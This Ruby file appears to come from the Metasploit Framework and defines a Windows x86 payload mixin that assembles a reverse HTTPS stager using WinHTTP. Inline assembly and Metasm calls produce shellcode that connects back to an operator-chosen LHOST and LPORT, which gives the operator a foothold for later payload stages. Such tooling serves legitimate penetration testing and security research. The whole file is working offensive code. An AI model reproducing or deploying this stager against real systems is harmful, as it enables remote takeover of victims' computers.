# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/windows/reverse_winhttp'

module Msf


###
#
# Complex payload generation for Windows ARCH_X86 that speak HTTPS using WinHTTP
#
###


module Payload::Windows::ReverseWinHttps

  include Msf::Payload::Windows::ReverseWinHttp

  #
  # Generate and compile the stager
  #
  def generate_reverse_winhttps(opts={})
    combined_asm = %Q^
      cld                    ; Clear the direction flag.
      call start             ; Call start, this pushes the address of 'api_call' onto the stack.
      #{asm_block_api}
      start:
        pop ebp
      #{asm_reverse_winhttp(opts)}
    ^
    Metasm::Shellcode.assemble(Metasm::X86.new, combined_asm).encode_string
  end

  #
  # Generate the first stage
  #
  def generate

    # Generate the simple version of this stager if we don't have enough space
    if self.available_space.nil? || required_space > self.available_space
      return generate_reverse_winhttps(
        ssl:  true,
        host: datastore['LHOST'],
        port: datastore['LPORT'],
        url:  generate_small_uri)
    end

    conf = {
      ssl:  true,
      host: datastore['LHOST'],
      port: datastore['LPORT'],
      url:  generate_uri,
      exitfunk: datastore['EXITFUNC']
    }

    generate_reverse_winhttps(conf)
  end

end

end

